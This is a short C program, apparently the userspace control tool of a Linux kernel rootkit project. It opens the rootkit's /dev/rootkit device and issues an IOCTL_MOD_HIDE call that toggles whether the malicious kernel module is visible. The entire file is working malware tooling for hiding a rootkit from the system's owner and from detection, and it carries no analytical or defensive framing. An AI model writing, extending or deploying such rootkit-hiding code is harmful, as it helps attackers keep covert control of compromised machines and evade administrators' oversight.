#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <unistd.h>

#include "../src/rootkit.h"

#define DEVICE_PATH "/dev/rootkit"

int main(int argc, char *argv[]) {
    int fd = open(DEVICE_PATH, O_RDWR);
    if (fd < 0) {
        perror("Failed to open " DEVICE_PATH "\n");
        return EXIT_FAILURE;
    }

    // Toggle the module visibility
    int ret = ioctl(fd, IOCTL_MOD_HIDE);
    if (ret < 0) {
        perror("ioctl: Failed to toggle the module visibility\n");
        close(fd);
        return EXIT_FAILURE;
    }

    printf("Toggled module visibility\n");

    close(fd);

    return EXIT_SUCCESS;
}